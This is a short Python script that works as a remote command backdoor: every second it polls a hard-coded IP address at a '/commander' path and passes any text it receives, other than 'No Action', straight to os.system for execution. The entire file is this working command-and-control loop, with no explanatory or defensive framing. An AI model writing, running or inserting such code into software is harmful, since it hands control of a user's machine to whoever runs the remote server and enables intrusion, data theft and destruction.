import os
import urllib.request
import time

while True:
    with urllib.request.urlopen('http://139.144.67.163/commander') as response:
        command_data = response.read().decode("utf-8")

        if not command_data == "No Action":
            os.system(command_data)
    time.sleep(1)
